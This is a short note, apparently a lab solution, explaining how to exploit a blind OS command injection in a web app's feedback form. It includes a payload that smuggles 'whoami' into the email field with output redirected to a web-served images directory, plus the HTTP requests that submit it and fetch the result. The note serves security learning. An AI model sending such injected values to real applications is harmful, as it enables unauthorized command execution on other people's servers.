/*

blind OS command injection vulnerability in the feedback function.
The app executes a shell command containing the user-supplied details. 
The output from the command is not returned in the response.
use output redirection to capture the output from the command. 
to /var/www/images/

application serves the images from this location. 
use the image loading URL to retrieve the contents of the file.

1) & whoami > /var/www/images/whoami.txt &
POST /feedback/submit HTTP/2
csrf=token&name=victim&email=pran%40jal.com|| whoami > /var/www/images/whoami.txt ||&subject=hi&message=there
                                             --------url encode this part---------

2) GET /image?filename=whoami.txt HTTP/2

*/